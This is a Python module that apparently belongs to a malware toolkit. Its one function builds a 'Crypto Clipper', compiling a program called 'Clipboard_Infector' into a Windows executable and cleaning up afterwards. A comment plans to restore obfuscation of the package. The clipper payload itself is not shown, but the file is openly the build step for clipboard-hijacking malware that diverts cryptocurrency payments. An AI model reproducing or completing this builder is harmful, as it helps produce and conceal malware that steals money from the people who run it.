import os
import shutil
from cookies_package import *
from util.plugins.common import clear, cleanup, compile
from colorama import Fore


def Create_Crypto_Clipper():
    clear()
    filename = "Clipboard_Infector"
    try:
        # Add back cookies_packge obfusacation after update

        print(f"{Fore.CYAN}\nCreating Clipboard Infector named {Fore.GREEN}{filename}{Fore.CYAN}.exe\n{Fore.RESET}")
        compile(filename)   # Compile the file to executable
        shutil.move(f"{os.getcwd()}\\dist\\{filename}.exe", f"{os.getcwd()}\\{filename}.exe")   # Move the executable from dist folder to the current directory
        cleanup(filename)   # Cleanup the files

    except Exception as e:
        print(f"{Fore.RED}Error while creating checker: \n\n{Fore.RESET}{e}")
        cleanup(filename)   # Cleanup the files
        input(f'\n\n{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')

    print(f"\n{Fore.GREEN}Clipboard Infector Created{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.RESET}Enter anything to continue. . .  {Fore.WHITE}')